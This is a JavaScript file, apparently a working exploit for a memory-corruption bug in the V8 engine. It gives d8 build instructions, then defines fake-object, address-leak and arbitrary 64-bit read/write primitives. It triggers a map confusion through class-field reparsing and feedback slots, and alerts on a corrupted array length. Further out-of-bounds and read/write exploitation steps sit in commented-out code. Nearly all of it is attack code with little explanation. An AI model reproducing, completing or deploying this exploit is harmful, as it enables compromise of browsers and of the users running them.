<script>
  // Build d8 using:
// a) Run once
//    git checkout 18865d6af0404f2d2aeb1c99dd73503364ce0967
//    gclient sync
//    gn gen ./out/x64.debug
//    gn gen ./out/x64.release
//
// b) 
//    Debug Build:
//    ninja -C ./out/x64.debug d8
//
//    Release Build:
//    ninja -C ./out/x64.release d8
//
// Run:
// C:\path\to\v8\d8.exe --allow-natives-syntax --bytecode-old-age=3 exploit.js

var arr_buf = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);

function dtoi(f) {
    f64_arr[0] = f;
    return b64_arr[0];
}

function itod(i) {
    b64_arr[0] = i;
    return f64_arr[0];
}

function ptr(addr) {
    return addr | 1n;
}
function unptr(addr) {
    return addr & ~1n;
}

function smi(i) {
    return i << 1n;
}
function unsmi(i) {
    return i >> 1n;
}

const FIXED_ARRAY_HEADER_SIZE = 8n;
var large_arr = new Array(0x10000);
large_arr.fill(itod(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
var packed_map = null;
var packed_double_map = null;
var packed_double_props = null;
var fake_arr_elements_addr = null;
var fake_arr = null;

function fake_obj(addr) {
    large_arr[0] = itod(packed_map | (packed_double_props << 32n));
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));
    large_arr[3] = itod(ptr(addr));
    
    let result = fake_arr[0];
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 
    
    return result;
}


function addr_of(obj) {
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));
    
    fake_arr[0] = obj;
    let result = dtoi(large_arr[3]) & 0xFFFFFFFFn;
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 
    
    return result;
}

function v8_read64(addr) {
    addr -= FIXED_ARRAY_HEADER_SIZE;
    
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));
    
    let result = dtoi(fake_arr[0]);
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); 

    return result;    
}

function v8_write64(addr, val) {
    addr -= FIXED_ARRAY_HEADER_SIZE;
    
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));
    
    fake_arr[0] = itod(val);
    
    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));   
}

function trigger_gc() {
    try {
      let tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
    tt = new ArrayBuffer(31 * 1024 * 1024 * 1024);
    } catch(err) {
        print(err);
    }
}

function make_small() {
    let result = {};
    result.p1 = 1;
    return result;
}

function make_big() {
    //These are all inline properties. If we make a smaller object have the 
    //same MAP as this then we will be able to access out of bounds.
    let result = {
        p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10, 
        p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18
    };
    //We need to add the extra property to transition to a new MAP with a cleared
    //validity cell. Also, the extra field is external and captures the write so
    //that doesn't interfere with our inline properties.
    result.extra = 1;
    return result;
}

var small_obj = make_small();
var big_obj = make_big();
var corrupted_obj = null;
var arr1 = null;
var arr2 = null;
console.log("small ==========================\n");
//%DebugPrint(small_obj);
console.log("big ==========================\n");
//%DebugPrint(big_obj);
// %SystemBreak();
for(let i = 0; i < 23; i++) {
    console.log(i + " ===============================\n");
    //this prevents bad results from LoadGlobalNotInsideTypeof slots from crashing the exploit
    function dummy() { return true;}
    
    //use locals here instead of globals because it would create extra slots in the feedback vector
    let target = {}; //this is the object we want to change the map of.
    let SetNamedStrict_slot1 = {}; //this gets transitioned to "small_obj" MAP once we add property p1
    let LoadProperty_slot0 = big_obj; //this is the MAP we want to transition to.
    if(i == 22) {
        console.log("GC ==========================\n");
        //this causes the code to be reparsed!
        trigger_gc();
        //allocate all the objects after GC so that they are allocated in NewSpace
        corrupted_obj = make_small();
        target = corrupted_obj;
        arr1 = [1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310]; //0x0000222200002222        
        arr2 = [large_arr,2,arr1,4,5,6,7,8];
    }
    
    //This will cause corrupted_obj (small_obj MAP) to transition to a big_obj MAP
    //Unfortunately because of the nature of the vulnerability we cant put this in it's own function :-(
    ((a = class Clazz {
        [({a: eval(), 
           b: dummy(eval), //consumes 2 feedback slots upon reparse
           c: dummy(
                eval, //consumes 2 feedback slots upon reparse
                target.p1 = 1, //this is where the target SetNamedStrict slot will be
                [], //this Literal use one feedback slot. This is important. Has to be a valid pointer!
                SetNamedStrict_slot1.p1 = 1, //small_obj MAP will be in the second SetNamedStrict slot
                LoadProperty_slot0.p1 //big_obj MAP will be in the first LoadProperty slot
             )
          }
        ? 1000000 : (ballast = 1)) //this crap is to make sure the slot length of the feedback vector and feedback metadata are equal
       ]
    }) => {})();
}
// console.log('xmzysnypnc');
//%DebugPrint(corrupted_obj);
// %DebugPrint(arr1);
alert(arr1.length);
// corrupted_obj.p18 = 0x30; //modify length of arr1 array
// // alert("1");
// console.log(arr1.length);
// // %SystemBreak();
// let large_arr_addr = dtoi(arr1[7]) & 0xFFFFFFFFn;
// let large_arr_elements_field_addr = large_arr_addr + 8n;
// let arr1_addr = dtoi(arr1[8]) & 0xFFFFFFFFn;

// let packed_double_map_and_props = dtoi(arr1[4]);
// packed_double_map = packed_double_map_and_props & 0xFFFFFFFFn;
// packed_double_props = packed_double_map_and_props >> 32n;
// let packed_double_elements = dtoi(arr1[5]) & 0xFFFFFFFFn;

// let packed_map_and_props = dtoi(arr1[11]);
// packed_map = packed_map_and_props & 0xFFFFFFFFn;
// let packed_props = packed_map_and_props >> 32n;

// let fixed_arr_map = dtoi(arr1[6]) & 0xFFFFFFFFn;

// arr1[0] = itod(packed_double_map | (packed_double_props << 32n));
// arr1[1] = itod((large_arr_elements_field_addr - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));

// let temp_fake_arr_addr = packed_double_elements + FIXED_ARRAY_HEADER_SIZE;
// arr1[7] = itod(temp_fake_arr_addr);
// let temp_fake_arr = arr2[0];
// let large_arr_elements_addr = dtoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
// temp_fake_arr = null;

// let fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
// fake_arr_elements_addr = fake_arr_addr + 16n;

// large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
// large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
// large_arr[2] = itod(fixed_arr_map | (smi(0n) << 32n));

// arr1[7] = itod(fake_arr_addr);
// fake_arr = arr2[0];

// //cleanup
// let small_obj_addr = addr_of(small_obj);
// let small_obj_map_and_props = v8_read64(small_obj_addr);
// let corrupted_obj_addr = addr_of(corrupted_obj);
// v8_write64(corrupted_obj_addr, small_obj_map_and_props); //restore the corrupted MAP
// corrupted_obj = null;


// console.log("large arr ======================\n");
// %DebugPrint(large_arr);
// console.log("arr1 ===========================\n");
// %DebugPrint(arr1);
// console.log("arr2 ===========================\n");
// %DebugPrint(arr2);
// console.log("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
// console.log("small_obj_map_and_props = " + small_obj_map_and_props.toString(16) + "\n");
// console.log("corrupted_obj_addr = " + corrupted_obj_addr.toString(16) + "\n");


// console.log("large_arr_addr = " + large_arr_addr.toString(16) + "\n");
// console.log("arr1_addr = " + arr1_addr.toString(16) + "\n");
// console.log("fixed_arr_map = " + fixed_arr_map.toString(16) + "\n");
// console.log("packed_double_elements = " + packed_double_elements.toString(16) + "\n");
// console.log("large_arr_elements_addr = " + large_arr_elements_addr.toString(16) + "\n");
// console.log("fake_arr_addr = " + fake_arr_addr.toString(16) + "\n");

//%DebugPrint(fake_arr);

</script>
